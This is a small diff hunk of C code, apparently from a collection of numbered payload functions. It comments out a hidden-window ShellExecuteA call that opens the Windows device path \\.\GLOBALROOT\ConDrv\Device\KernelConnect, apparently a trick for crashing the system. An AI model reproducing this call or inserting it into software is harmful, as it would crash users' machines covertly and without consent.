@@ -407,7 +407,7 @@ int p14()
 
         RtlMoveMemory(GetCommandLineA(), "", 0);
 
-        ShellExecuteA(NULL, NULL, "\\\\.\\GLOBALROOT\\ConDrv\\Device\\KernelConnect", NULL, NULL, SW_HIDE);
+        //ShellExecuteA(NULL, NULL, "\\\\.\\GLOBALROOT\\ConDrv\\Device\\KernelConnect", NULL, NULL, SW_HIDE);
     }
     
 }
